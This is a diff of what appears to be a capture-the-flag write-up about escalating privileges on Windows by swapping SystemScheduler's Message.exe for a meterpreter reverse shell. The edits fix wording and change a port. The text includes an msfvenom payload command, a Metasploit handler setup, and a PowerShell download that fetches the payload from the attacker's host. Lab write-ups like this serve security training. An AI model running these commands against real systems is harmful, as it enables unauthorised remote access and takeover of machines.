@@ -562,14 +562,14 @@ meterpreter > cd jeff
 [-] stdapi_fs_chdir: Operation failed: Access is denied.
 ~~~
 
-Time to replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell. Let's first generate new reverse shell (use a new port) that we will name `Message.exe`:
+Time to replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell. Let's first generate a new reverse shell (use a new port) that we will name `Message.exe`:
 
 ~~~
-$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=2345 -f exe -o Message.exe
+$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=3456 -f exe -o Message.exe
 $ python3 -m http.server
 ~~~
 
-In Metasploit, configure the handler:
+In Metasploit, configure the TCP handler:
 
 ~~~
 msf5 > use exploit/multi/handler
@@ -584,7 +584,7 @@ msf5 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.9.**.**:3456 
 ~~~
 
-In the existing reverse shell, download your new reverse shell:
+In the existing reverse shell, download your new reverse shell to replace the initial `Message.exe` with it:
 
 ~~~
 powershell -c "Invoke-WebRequest -Uri 'http://10.9.**.**:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
